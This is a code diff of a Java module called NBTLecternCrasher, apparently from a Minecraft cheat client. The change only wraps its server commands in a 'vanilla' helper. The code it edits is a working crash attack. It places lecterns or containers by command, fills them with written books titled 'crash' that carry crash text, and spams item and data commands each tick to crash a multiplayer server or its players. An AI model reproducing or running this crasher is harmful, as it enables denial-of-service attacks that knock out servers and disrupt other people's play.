@@ -212,32 +212,32 @@ public class NBTLecternCrasher extends Module {
             switch (target) {
                 case Lectern -> {
                     if (!lecternPlaced) {
-                        mc.player.connection.sendCommand(
-                                CommandUtils.formatCommand("setblock %d %d %d minecraft:lectern", pos.getX(), pos.getY(), pos.getZ()));
+                        mc.player.connection.sendCommand(CommandUtils.vanilla(
+                                CommandUtils.formatCommand("setblock %d %d %d minecraft:lectern", pos.getX(), pos.getY(), pos.getZ())));
                         lecternPlaced = true;
                         info("Lectern placed! Phase 2: Spamming interactions...");
                     }
                 }
                 case Chest -> {
                     if (!containerPlaced) {
-                        mc.player.connection.sendCommand(
-                                CommandUtils.formatCommand("setblock %d %d %d minecraft:chest", pos.getX(), pos.getY(), pos.getZ()));
+                        mc.player.connection.sendCommand(CommandUtils.vanilla(
+                                CommandUtils.formatCommand("setblock %d %d %d minecraft:chest", pos.getX(), pos.getY(), pos.getZ())));
                         containerPlaced = true;
                         info("Chest placed! Filling with crash items...");
                     }
                 }
                 case Barrel -> {
                     if (!containerPlaced) {
-                        mc.player.connection.sendCommand(
-                                CommandUtils.formatCommand("setblock %d %d %d minecraft:barrel", pos.getX(), pos.getY(), pos.getZ()));
+                        mc.player.connection.sendCommand(CommandUtils.vanilla(
+                                CommandUtils.formatCommand("setblock %d %d %d minecraft:barrel", pos.getX(), pos.getY(), pos.getZ())));
                         containerPlaced = true;
                         info("Barrel placed! Filling with crash items...");
                     }
                 }
                 case Shulker -> {
                     if (!containerPlaced) {
-                        mc.player.connection.sendCommand(
-                                CommandUtils.formatCommand("setblock %d %d %d minecraft:shulker_box", pos.getX(), pos.getY(), pos.getZ()));
+                        mc.player.connection.sendCommand(CommandUtils.vanilla(
+                                CommandUtils.formatCommand("setblock %d %d %d minecraft:shulker_box", pos.getX(), pos.getY(), pos.getZ())));
                         containerPlaced = true;
                         info("Shulker box placed! Filling with crash items...");
                     }
@@ -271,11 +271,11 @@ public class NBTLecternCrasher extends Module {
                 String placeBookCmd = CommandUtils.formatCommand(
                         "item replace block %d %d %d container.0 with written_book[written_book_content={title:\"crash\",author:\"orbiter\",pages:['{\\\"text\\\":\\\"%s\\\"}']}]",
                         targetPos.getX(), targetPos.getY(), targetPos.getZ(), escapedCrashText);
-                mc.player.connection.sendCommand(placeBookCmd);
+                mc.player.connection.sendCommand(CommandUtils.vanilla(placeBookCmd));
 
                 String pageCmd = CommandUtils.formatCommand("data modify block %d %d %d Page set value %d",
                         targetPos.getX(), targetPos.getY(), targetPos.getZ(), 0);
-                mc.player.connection.sendCommand(pageCmd);
+                mc.player.connection.sendCommand(CommandUtils.vanilla(pageCmd));
             }
         } else {
             for (int i = 0; i < commandsPerTick.get(); i++) {
@@ -283,14 +283,14 @@ public class NBTLecternCrasher extends Module {
                 String itemCmd = CommandUtils.formatCommand(
                         "item replace block %d %d %d container.%d with written_book[written_book_content={title:\"crash\",author:\"orbiter\",pages:['{\\\"text\\\":\\\"%s\\\"}']}]",
                         targetPos.getX(), targetPos.getY(), targetPos.getZ(), slot, escapedCrashText);
-                mc.player.connection.sendCommand(itemCmd);
+                mc.player.connection.sendCommand(CommandUtils.vanilla(itemCmd));
             }
 
             if (tickCounter % 5 == 0) {
                 for (int slot = 0; slot < Math.min(containerSlots.get(), 27); slot++) {
                     String dataCmd = CommandUtils.formatCommand("data modify block %d %d %d Items[%d].count set value 64",
                             targetPos.getX(), targetPos.getY(), targetPos.getZ(), slot);
-                    mc.player.connection.sendCommand(dataCmd);
+                    mc.player.connection.sendCommand(CommandUtils.vanilla(dataCmd));
                 }
             }
         }
